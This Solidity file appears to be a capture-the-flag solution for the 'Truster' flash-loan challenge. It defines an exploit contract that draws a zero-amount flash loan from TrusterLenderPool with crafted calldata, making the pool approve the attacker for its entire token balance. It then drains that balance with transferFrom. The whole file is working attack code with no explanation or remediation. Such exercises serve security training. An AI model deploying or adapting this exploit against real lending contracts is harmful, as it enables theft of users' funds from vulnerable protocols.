// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract TrusterReceiverExploit {
    using Address for address;

    TrusterLenderPool private immutable pool;
    IERC20 public immutable token;
    address public immutable owner;

    constructor(address poolAddress, address tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        token = IERC20(tokenAddress);
        owner = msg.sender;
    }

    function executeExploit() external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this), amount
            );
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}